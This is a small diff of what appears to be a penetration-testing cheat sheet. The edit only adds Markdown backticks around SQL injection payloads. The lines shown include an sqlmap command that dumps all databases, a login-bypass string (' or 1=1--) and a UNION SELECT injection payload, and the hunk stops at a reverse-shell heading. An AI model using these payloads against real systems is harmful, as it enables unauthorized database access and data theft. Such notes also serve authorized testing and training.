@@ -46,9 +46,9 @@
 - then run
 - `sqlmap -r req.txt --tamper=space2comment --dump-all --dbms mysql`
 
-- try ' or 1=1-- in the username and password field
+- try `' or 1=1--` in the username and password field
 - enumrate how many columns there are
-- `user='UNION SELECT NULL,'test',NULL,NULL--&password=admin
+- `user='UNION SELECT NULL,'test',NULL,NULL--&password=admin`
 
 ### msfvenom and msfconsole reverse shell
 
